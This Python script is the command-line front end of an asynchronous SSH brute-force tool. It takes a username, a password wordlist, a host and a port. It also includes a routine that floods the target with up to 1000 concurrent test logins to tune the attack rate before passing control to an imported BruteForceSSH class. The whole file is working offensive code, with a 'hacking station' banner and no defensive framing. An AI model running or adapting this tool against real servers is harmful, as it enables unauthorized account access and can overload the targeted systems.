import argparse
import asyncio, asyncssh
from utility import Utility
from asyncsshpool import BruteForceSSH

sem ="""set a semaphore to limit the number of simultaneous requests
if < 0  the tool will try to find out the optimal 
        ratio for simultaneous requests
else    Default/Passed value is used
"""


parser = argparse.ArgumentParser(
        prog="brute.py",
        description="- [ Options ] -",
        formatter_class=argparse.RawTextHelpFormatter,
        )
parser.add_argument('-u', '--user',     type=str, metavar='', required=True, help='user')
parser.add_argument('-w', '--wordlist', type=str, metavar='', required=True, help='password wordlist')
parser.add_argument('-a', '--address',  default="127.0.0.1", type=str, metavar='', required=False, help='host address')
parser.add_argument('-p', '--port',     default=22, type=int, metavar='', required=False, help='port to connect to host')
parser.add_argument('--sem',            default=100, type=int, metavar='', required=False, help=sem)
parser.add_argument('--async-sleep',    default=0, type=float, metavar='', required=False, help='sleep for a specified amount of seconds before retrying')

args = parser.parse_args()

def calculateConcurrency():
    N = 1000
    while True:
        
        async def run_client(host: str, port: int, command: str) -> asyncssh.SSHCompletedProcess:
            async with asyncssh.connect(host, username="TestUsername", password="TestPassword", port=port, known_hosts=None, keepalive_interval=100) as conn:
                return await conn.run(command)

        async def run_multiple_clients(host: str, port: int) -> None:
            succ: int = 0
            err: int = 0
            hosts: list = N * [host]
            tasks: list = [run_client(host, port, 'echo "Hello from ur new hacking station :) " ; ls') for host in hosts]
            results: list = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, asyncssh.PermissionDenied):
                    succ += 1
                elif isinstance(result, Exception):
                    err += 1
                else:
                    succ += 1
            return succ, err
        
        print(f"\33[1;36;1mtrying with {N} concurrently request...")
        succ, err = asyncio.run(run_multiple_clients(args.address, args.port))
        print(f"\33[1;36;1mRequest Intercepted by Exception:\t{err}\nRequest succesfully sent:\t\t{succ}")
        if err > succ + 20:
            print(f"\33[1;31;1mthe gap is too big try to lower rps...\n")
            N = N >> 1
        elif succ / err < 1.4:
            print(f"\33[1;33;1mNearly to optimal gap try to lower rps a little bit...\n")
            N = N - 5 
        else:
            print(f"\33[1;32;1mthe gap is acceptable... start with: {N} rps\n")
            return N
        if N < 95:
            return 95

if __name__ == '__main__':
    Utility(args.address, args.port, args.wordlist)
    if args.sem < 0:
        args.sem = calculateConcurrency()
    
    print(args)
    b = BruteForceSSH(
        args.user,
        args.address,
        args.port,
        args.wordlist,
        args.sem,
        args.async_sleep,
    )
    try:
        b.run()
    except KeyboardInterrupt as k:
        print(f"\nQuitting...")
    except Exception as e:
        print(f"{e}\nQuitting...")
    